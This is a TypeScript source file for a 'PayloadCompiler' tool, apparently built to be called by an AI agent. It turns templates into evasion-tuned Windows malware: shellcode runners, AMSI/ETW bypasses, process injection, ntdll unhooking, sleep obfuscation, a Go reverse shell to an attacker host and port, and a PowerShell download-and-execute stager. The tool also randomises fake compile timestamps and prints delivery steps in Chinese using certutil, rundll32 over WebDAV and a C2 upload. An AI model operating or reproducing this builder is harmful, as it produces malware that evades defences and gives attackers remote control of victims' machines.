/**
 * PayloadCompilerTool — compiles parameterized payload templates into evasion-ready binaries.
 *
 * Loads C/Go/PowerShell source templates from payloadSources/, replaces placeholders,
 * cross-compiles with MinGW/garble, and returns compilation results with fingerprint info.
 */

import { exec as execCb } from 'child_process'
import { promisify } from 'util'
import { randomBytes, randomInt } from 'crypto'
import { readFileSync, writeFileSync, mkdirSync, existsSync, readdirSync } from 'fs'
import { join, dirname } from 'path'
import { fileURLToPath } from 'url'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

const exec = promisify(execCb)

const __dirname = dirname(fileURLToPath(import.meta.url))
const PAYLOAD_SOURCES_DIR = join(__dirname, 'payloadSources')

// MinGW compilation flags — optimized for evasion
const MINGW_FLAGS = [
  '-Os',
  '-fno-asynchronous-unwind-tables',
  '-fno-ident',
  '-falign-functions=1',
  '-fpack-struct=8',
  '--no-seh',
  '--gc-sections',
  '-s',
  '-nostdlib',
]

const MINGW_LIBS = ['-lkernel32', '-lntdll']

// Template metadata
const TEMPLATE_META: Record<string, { ext: string; compiler: string; desc: string }> = {
  shellcode_runner: { ext: '.c', compiler: 'x86_64-w64-mingw32-gcc', desc: 'Indirect syscall shellcode runner: PEB walking + SSN extraction + mov r10,rcx/syscall' },
  amsi_etw_bypass: { ext: '.c', compiler: 'x86_64-w64-mingw32-gcc', desc: 'Hardware breakpoint AMSI/ETW bypass: Dr0+VEH (no memory patching)' },
  process_inject: { ext: '.c', compiler: 'x86_64-w64-mingw32-gcc', desc: 'APC process injection: self or remote via QueueUserAPC + alertable wait' },
  reflective_loader: { ext: '.c', compiler: 'x86_64-w64-mingw32-gcc', desc: 'Reflective DLL loader: in-memory PE parsing + import fixup + relocation' },
  unhook_loader: { ext: '.c', compiler: 'x86_64-w64-mingw32-gcc', desc: 'RefreshPE unhook: reload ntdll .text from disk' },
  sleep_obfuscation: { ext: '.c', compiler: 'x86_64-w64-mingw32-gcc', desc: 'Sleep obfuscation (Ekko/Foliage): RC4 encrypt image during sleep' },
  go_payload: { ext: '.go', compiler: 'go', desc: 'Go reverse shell (garble-obfuscated ready)' },
  ps_amsi_bypass: { ext: '.ps1', compiler: 'none', desc: 'PowerShell AMSI bypass via reflection + command execution' },
}

interface PayloadCompilerInput {
  template: string
  shellcode?: string
  dll_hex?: string
  lhost?: string
  lport?: number
  target_pid?: number
  payload_url?: string
  command?: string
  rc4_key?: string
  sleep_ms?: number
  platform?: 'windows' | 'linux'
  compile?: boolean
}

export class PayloadCompilerTool implements Tool {
  name = 'PayloadCompiler'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'PayloadCompiler',
      description: `Compile evasion-aware binaries from parameterized templates.

## Templates
- shellcode_runner: Indirect syscall runner — PEB walking + SSN extraction + mov r10,rcx/syscall (requires shellcode hex)
- amsi_etw_bypass: Hardware breakpoint AMSI/ETW bypass — Dr0+VEH, no memory patching (requires shellcode hex)
- process_inject: APC injection — self via QueueUserAPC+SleepEx or remote PID (requires shellcode hex + optional PID)
- reflective_loader: Reflective DLL loader — in-memory PE parsing + import fixup + relocation (requires DLL hex)
- unhook_loader: RefreshPE — reload ntdll .text section from disk (requires shellcode hex)
- sleep_obfuscation: Sleep obfuscation (Ekko/Foliage) — RC4 encrypt image during sleep (requires shellcode hex + sleep_ms + RC4 key)
- go_payload: Go reverse shell (requires lhost + lport)
- ps_amsi_bypass: PowerShell AMSI bypass (requires payload_url or command)

## Parameters
- template: template name
- shellcode: hex shellcode string (e.g. "fc4883e4f0e8..." or comma-separated "0xfc,0x48,...")
- lhost: attacker IP (for go_payload)
- lport: attacker port (for go_payload)
- target_pid: target process PID (for process_inject, 0=self)
- payload_url: URL to download/execute (for ps_amsi_bypass)
- command: direct command (for ps_amsi_bypass)
- platform: target platform (default: windows)
- compile: whether to actually compile (default: true if compiler available)`,
      parameters: {
        type: 'object',
        properties: {
          template: { type: 'string', description: 'Template name' },
          shellcode: { type: 'string', description: 'Hex shellcode (e.g. "fc4883..." or "0xfc,0x48,...")' },
          lhost: { type: 'string', description: 'Attacker IP' },
          lport: { type: 'number', description: 'Attacker port' },
          target_pid: { type: 'number', description: 'Target PID for injection (0=self)' },
          payload_url: { type: 'string', description: 'Payload download URL' },
          command: { type: 'string', description: 'Direct command to execute' },
          platform: { type: 'string', enum: ['windows', 'linux'], description: 'Target platform' },
          compile: { type: 'boolean', description: 'Compile to binary (default: true)' },
        },
        required: ['template'],
      },
    },
  }

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const {
      template,
      shellcode,
      lhost,
      lport,
      target_pid,
      payload_url,
      command,
      platform = 'windows',
      compile = true,
    } = input as unknown as PayloadCompilerInput

    const meta = TEMPLATE_META[template]
    if (!meta) {
      const available = Object.keys(TEMPLATE_META).join(', ')
      return { content: `[PayloadCompiler] Unknown template: ${template}\nAvailable: ${available}`, isError: true }
    }

    const srcPath = join(PAYLOAD_SOURCES_DIR, `${template}${meta.ext}`)
    if (!existsSync(srcPath)) {
      return { content: `[PayloadCompiler] Template source not found: ${srcPath}`, isError: true }
    }

    let source = readFileSync(srcPath, 'utf-8')

    // ── Replace placeholders ──
    if (shellcode) {
      const hexBytes = this.parseShellcode(shellcode)
      source = source.replace(/\{\{SHELLCODE_BYTES\}\}/g, hexBytes.map((b) => `0x${b.toString(16).padStart(2, '0')}`).join(','))
      source = source.replace(/\{\{SHELLCODE_LEN\}\}/g, String(hexBytes.length))
    }
    /* DLL hex data for reflective_loader */
    if (input['dll_hex']) {
      const hexBytes = this.parseShellcode(input['dll_hex'] as string)
      source = source.replace(/\{\{DLL_HEX\}\}/g, hexBytes.map((b) => `0x${b.toString(16).padStart(2, '0')}`).join(','))
      source = source.replace(/\{\{DLL_LEN\}\}/g, String(hexBytes.length))
    }
    /* RC4 key for sleep_obfuscation */
    if (input['rc4_key']) {
      const rc4Bytes = this.parseShellcode(input['rc4_key'] as string)
      source = source.replace(/\{\{RC4_KEY\}\}/g, rc4Bytes.map((b) => `0x${b.toString(16).padStart(2, '0')}`).join(','))
    }
    /* Sleep duration for sleep_obfuscation */
    if (input['sleep_ms']) {
      source = source.replace(/\{\{SLEEP_MS\}\}/g, String(input['sleep_ms']))
    }
    if (lhost) source = source.replace(/\{\{LHOST\}\}/g, lhost)
    if (lport) source = source.replace(/\{\{LPORT\}\}/g, String(lport))
    if (target_pid !== undefined) source = source.replace(/\{\{TARGET_PID\}\}/g, String(target_pid))
    if (payload_url) source = source.replace(/\{\{PAYLOAD_URL\}\}/g, payload_url)
    if (command) source = source.replace(/\{\{COMMAND\}\}/g, command)

    // ── Generate fingerprint ──
    const fingerprint = {
      xorKey: `0x${randomInt(1, 256).toString(16).toUpperCase().padStart(2, '0')}`,
      timestamp: this.randomPastTimestamp(),
      entryOffset: `0x${randomInt(0, 0x1FF).toString(16).toUpperCase()}`,
      compileId: randomBytes(4).toString('hex'),
    }

    // ── Determine output path ──
    const sessionDir = context.sessionDir ?? context.cwd
    const ext = meta.ext === '.ps1' ? '.ps1' : meta.ext === '.go' ? '.exe' : '.exe'
    const outName = `payload_${template}_${fingerprint.compileId}${ext}`
    const outPath = join(sessionDir, outName)

    // ── Compile if requested ──
    if (compile && meta.compiler !== 'none') {
      const compilerAvailable = await this.detectCompiler(meta.compiler)
      if (compilerAvailable) {
        return this.compileSource(source, meta, outPath, fingerprint, template, context)
      }
      // Fall through to source-only mode
    }

    // ── Return source-only ──
    const lines = [
      '[PayloadCompiler] Source generated (compiler not available or compile=false)',
      '═'.repeat(60),
      `  Template: ${template} — ${meta.desc}`,
      `  Platform: ${platform}`,
      `  Fingerprint: XOR key=${fingerprint.xorKey}, timestamp=${fingerprint.timestamp}, entry_offset=${fingerprint.entryOffset}`,
      `  Compile ID: ${fingerprint.compileId}`,
      '',
      '── Source Code ──',
      source,
      '',
      '── Compilation Instructions ──',
    ]

    if (meta.ext === '.c') {
      lines.push(`  x86_64-w64-mingw32-gcc ${MINGW_FLAGS.join(' ')} -o ${outName} source.c ${MINGW_LIBS.join(' ')}`)
      lines.push('')
      lines.push('  Install MinGW:')
      lines.push('    macOS:  brew install mingw-w64')
      lines.push('    Linux:  apt install gcc-mingw-w64-x86-64')
      lines.push('    Windows: choco install mingw')
    } else if (meta.ext === '.go') {
      lines.push('  GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o payload.exe source.go')
      lines.push('  garble:   garble -tiny build -o payload_garble.exe source.go')
    } else if (meta.ext === '.ps1') {
      lines.push('  powershell -ExecutionPolicy Bypass -File payload.ps1')
      lines.push('  Encoded:  powershell -enc (base64 of UTF-16LE bytes)')
    }

    return { content: lines.join('\n'), isError: false }
  }

  // ── Compile source to binary ──
  private async compileSource(
    source: string,
    meta: { ext: string; compiler: string; desc: string },
    outPath: string,
    fingerprint: { xorKey: string; timestamp: string; entryOffset: string; compileId: string },
    template: string,
    context: ToolContext,
  ): Promise<ToolResult> {
    const tmpDir = join(context.cwd, '.ovovo', 'payload_src')
    if (!existsSync(tmpDir)) mkdirSync(tmpDir, { recursive: true })

    const srcFile = join(tmpDir, `${template}_${fingerprint.compileId}${meta.ext}`)
    writeFileSync(srcFile, source)

    try {
      let compileCmd: string
      if (meta.ext === '.c') {
        const flags = MINGW_FLAGS.join(' ')
        const libs = MINGW_LIBS.join(' ')
        compileCmd = `x86_64-w64-mingw32-gcc ${flags} -o "${outPath}" "${srcFile}" ${libs}`
      } else if (meta.ext === '.go') {
        compileCmd = `GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o "${outPath}" "${srcFile}"`
      } else {
        return { content: `[PayloadCompiler] No compilation needed for ${meta.ext}`, isError: false }
      }

      const { stderr } = await exec(compileCmd, { timeout: 30_000 })

      // Get output file size
      const sizeCmd = process.platform === 'win32'
        ? `for %I in ("${outPath}") do @echo %~zI`
        : `stat -c%s "${outPath}" 2>/dev/null || wc -c < "${outPath}"`
      const { stdout: sizeOut } = await exec(sizeCmd, { timeout: 5_000 })
      const sizeBytes = parseInt(sizeOut.trim()) || 0
      const sizeKB = (sizeBytes / 1024).toFixed(1)

      const lines = [
        '[PayloadCompiler] 编译成功',
        '═'.repeat(60),
        `  模板: ${template} — ${meta.desc}`,
        `  编译器: ${meta.compiler}`,
        `  编译参数: ${meta.ext === '.c' ? MINGW_FLAGS.join(' ') : '-ldflags="-s -w -H=windowsgui"'}`,
        `  输出: ${outPath}`,
        `  文件大小: ${sizeKB} KB`,
        `  随机指纹: XOR key=${fingerprint.xorKey}, 编译时间戳=${fingerprint.timestamp}, 入口点偏移=${fingerprint.entryOffset}`,
        `  编译 ID: ${fingerprint.compileId}`,
      ]

      if (stderr) lines.push(`  编译警告: ${stderr.trim()}`)

      lines.push('')
      lines.push('── 投递建议 ──')
      lines.push('  UNC: 将二进制放到 WebDAV 共享, 目标执行 rundll32.exe \\\\server\\share\\payload.exe,EntryPoint')
      lines.push('  HTTP: python3 -m http.server 80 → 目标 certutil -urlcache -split -f http://IP/payload.exe')
      lines.push('  C2: 使用 C2Tool deploy_payload 上传')

      return { content: lines.join('\n'), isError: false }
    } catch (err) {
      const errMsg = (err as Error).message
      return {
        content: `[PayloadCompiler] 编译失败\n  错误: ${errMsg}\n\n返回完整源码，请手动编译:\n\n${source}`,
        isError: true,
      }
    }
  }

  // ── Detect available compiler ──
  private async detectCompiler(name: string): Promise<boolean> {
    try {
      const cmd = name === 'x86_64-w64-mingw32-gcc'
        ? 'x86_64-w64-mingw32-gcc --version'
        : `${name} version`
      await exec(cmd, { timeout: 5_000 })
      return true
    } catch {
      return false
    }
  }

  // ── Parse shellcode from hex string ──
  private parseShellcode(input: string): number[] {
    // Remove common prefixes: "0x", ",", spaces, newlines, "\\x"
    const cleaned = input
      .replace(/\\x/g, '')
      .replace(/0x/g, '')
      .replace(/,/g, ' ')
      .replace(/\n/g, ' ')
      .trim()

    const bytes: number[] = []
    const parts = cleaned.split(/\s+/)
    for (const part of parts) {
      if (part.length === 0) continue
      const val = parseInt(part, 16)
      if (!isNaN(val) && val >= 0 && val <= 255) {
        bytes.push(val)
      }
    }
    return bytes
  }

  // ── Generate random past timestamp ──
  private randomPastTimestamp(): string {
    const year = randomInt(2017, 2024)
    const month = randomInt(1, 13)
    const day = randomInt(1, 29)
    const hour = randomInt(0, 24)
    const min = randomInt(0, 60)
    return `${year}-${String(month).padStart(2, '0')}-${String(day).padStart(2, '0')} ${String(hour).padStart(2, '0')}:${String(min).padStart(2, '0')}`
  }
}
